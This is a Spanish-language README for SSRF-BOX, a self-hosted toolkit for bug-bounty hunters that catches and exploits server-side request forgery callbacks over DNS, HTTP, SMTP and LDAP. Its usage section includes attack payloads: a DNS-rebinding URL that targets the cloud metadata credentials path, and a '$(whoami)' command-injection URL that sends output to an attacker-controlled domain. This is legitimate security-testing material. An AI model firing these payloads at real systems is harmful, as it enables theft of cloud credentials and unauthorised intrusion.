# SSRF-BOX

Suite self-hosted de detección y explotación de vulnerabilidades SSRF para Bug Bounty.
Equivalente a Interactsh/Burp Collaborator, con control total sobre tu infraestructura.

## Arquitectura

```
                    ┌──────────────────────────────┐
  DNS queries   ──► │  dns-server :53               │
  (all *.oob.*)     │  • wildcard DNS               │
                    │  • DNS rebinding (TTL=1)       │
                    │  • exfiltración decodificada   │
                    └──────────┬───────────────────┘
                               │ POST /internal/interaction
                    ┌──────────▼───────────────────┐
  HTTP callbacks ──►│  http-server :80/:443          │
  SSRF hits         │  • catch-all interaction logger│
                    │  • cloud metadata simulation   │
                    │  • dashboard :8080             │
  Admin panel   ──► │  • REST API + WebSocket        │
                    │  • payload generator           │
                    └──────────┬───────────────────┘
                               │ POST /internal/interaction
  SMTP/LDAP/FTP ──► ┌──────────┴───────────────────┐
  connections       │  smtp-ldap :25/:389/:21/...    │
                    └──────────────────────────────┘
```

## Requisitos

- VPS con Ubuntu 22.04/24.04 e IP pública estática
- Un dominio con posibilidad de configurar NS records
- Docker + Docker Compose v2

## Instalación rápida

```bash
git clone <repo>
cd ssrf-box

# Instalación automática (Ubuntu 22.04/24.04)
sudo bash scripts/install-vps.sh
```

El script instala Docker, configura UFW, obtiene certificados TLS y levanta todos los servicios.

## Instalación manual

### 1. Configurar DNS

En tu proveedor de dominio (Cloudflare, etc.), añade:

```
# Registro NS — delega oob.tudominio.com a tu VPS
NS   oob.tudominio.com   →  tu-vps-ip

# Glue record — resuelve el propio NS server
A    oob.tudominio.com   →  tu-vps-ip
```

Verifica la propagación:
```bash
dig NS oob.tudominio.com
dig A test.oob.tudominio.com   # debe devolver tu-vps-ip
```

### 2. Configurar entorno

```bash
cp .env.example .env
# Edita .env con tu dominio, IP, y una API key segura
```

### 3. TLS (opcional pero recomendado)

```bash
# Certbot con DNS challenge manual (wildcard *.oob.tudominio.com)
certbot certonly --manual --preferred-challenges=dns \
  -d "*.oob.tudominio.com" -d "oob.tudominio.com"

# Añade al .env:
TLS_CERT_PATH=/ruta/a/fullchain.pem
TLS_KEY_PATH=/ruta/a/privkey.pem
```

### 4. Lanzar

```bash
docker compose up -d
docker compose logs -f    # ver logs en tiempo real
```

## Dashboard

Accede a `http://TU-VPS-IP:8080` con tu API key.

- **Interacciones en tiempo real** via WebSocket
- **Generador de payloads** (OOB, bypass, rebinding, cloud, protocolos)
- **Exportar** a JSON/CSV
- **Filtrar** por UUID, tipo (DNS/HTTP/SMTP/LDAP)

## API

### Autenticación
```
Header: X-API-Key: <tu-api-key>
Query:  ?apikey=<tu-api-key>
```

### Endpoints

```bash
# Generar payload con UUID único
POST /api/generate
{"type": "ssrf", "params": {"domain": "oob.tudominio.com"}}

# Listar interacciones
GET /api/interactions
GET /api/interactions/<uuid>
GET /api/interactions?type=dns&limit=100

# Crear DNS rebinding
POST /api/rebind
{"uuid": "abc123", "public_ip": "1.1.1.1", "private_ip": "169.254.169.254", "switch_after": 1}

# Estadísticas
GET /api/stats

# Exportar CSV
GET /api/export?uuid=abc123

# Borrar interacciones de un UUID
DELETE /api/interactions/<uuid>
```

## Generador de payloads CLI

Sin necesidad de tener el servidor arriba:

```bash
python3 scripts/generate-payloads.py --help

# OOB básico
python3 scripts/generate-payloads.py --type oob --domain oob.tudominio.com

# IP bypass (127.0.0.1 en todas sus variantes)
python3 scripts/generate-payloads.py --type bypass --target 127.0.0.1

# DNS Rebinding
python3 scripts/generate-payloads.py --type rebind --public-ip 1.1.1.1 --private-ip 169.254.169.254

# Cloud metadata
python3 scripts/generate-payloads.py --type cloud

# Todos los tipos, guardar en JSON
python3 scripts/generate-payloads.py --type all --output payloads.json
```

## Técnicas cubiertas

| Técnica | Descripción |
|---------|-------------|
| OOB básico | Subdominios UUID para correlacionar callbacks DNS+HTTP |
| Blind SSRF | DNS-only confirma SSRF aunque HTTP esté bloqueado |
| DNS Rebinding | TTL=1, alterna IPs para bypass de whitelists |
| IP Obfuscation | Decimal, hex, octal, IPv6, mixed |
| URL Parser Differentials | `user@ip`, `ip#@evil`, fragment tricks |
| Cloud Metadata | AWS IMDSv1/v2, GCP, Azure, Kubernetes |
| Protocol Smuggling | file://, dict://, gopher://, ldap://, smtp:// |
| DNS Exfiltration | Decodificación base64/hex de subdominios |
| SMTP/LDAP detection | Listeners pasivos en puertos 25/389/636 |

## Ejemplos de uso en Bug Bounty

```bash
# 1. Generar payload único para un target
curl -H "X-API-Key: $KEY" http://vps:8080/api/generate \
  -d '{"type":"ssrf","params":{"domain":"oob.tudominio.com"}}'
# → {"uuid":"a3f7b2d1","payloads":[{"payload":"http://a3f7b2d1.oob.tudominio.com",...}]}

# 2. Inyectar en el parámetro vulnerable
# https://target.com/api/fetch?url=http://a3f7b2d1.oob.tudominio.com/ssrf-test

# 3. Ver si llegó la interacción
curl -H "X-API-Key: $KEY" http://vps:8080/api/interactions/a3f7b2d1

# 4. DNS Rebinding para acceder a 169.254.169.254
curl -H "X-API-Key: $KEY" http://vps:8080/api/rebind \
  -d '{"uuid":"b1c2d3e4","public_ip":"1.1.1.1","private_ip":"169.254.169.254","switch_after":1}'
# Payload: http://rebind-b1c2d3e4.oob.tudominio.com/latest/meta-data/iam/security-credentials/

# 5. Exfiltración DNS (el target ejecuta comandos)
# Payload: http://$(whoami).a3f7b2d1.oob.tudominio.com/
# En dashboard aparecerá: decoded_data = "www-data"
```

## Seguridad del servidor

- UFW configurado para exponer solo los puertos necesarios
- Fail2ban protege el admin dashboard
- API key obligatoria para el panel de administración
- Los endpoints de interacción (port 80) no requieren auth (necesario para SSRF callbacks)
- Logs rotativos (10MB × 5 ficheros por servicio)

## Variables de entorno

| Variable | Descripción | Default |
|----------|-------------|---------|
| `SSRF_DOMAIN` | Dominio OOB (ej: oob.tudominio.com) | requerido |
| `VPS_IP` | IP pública del VPS | requerido |
| `API_KEY` | API key del dashboard admin | requerido |
| `INTERNAL_API_KEY` | Clave interna entre contenedores | requerido |
| `TLS_CERT_PATH` | Ruta al certificado TLS (en contenedor) | — (HTTP only) |
| `TLS_KEY_PATH` | Ruta a la clave privada TLS | — (HTTP only) |
| `DISCORD_WEBHOOK` | Webhook Discord para notificaciones | — |
| `TELEGRAM_BOT_TOKEN` | Token bot Telegram | — |
| `TELEGRAM_CHAT_ID` | Chat ID Telegram | — |
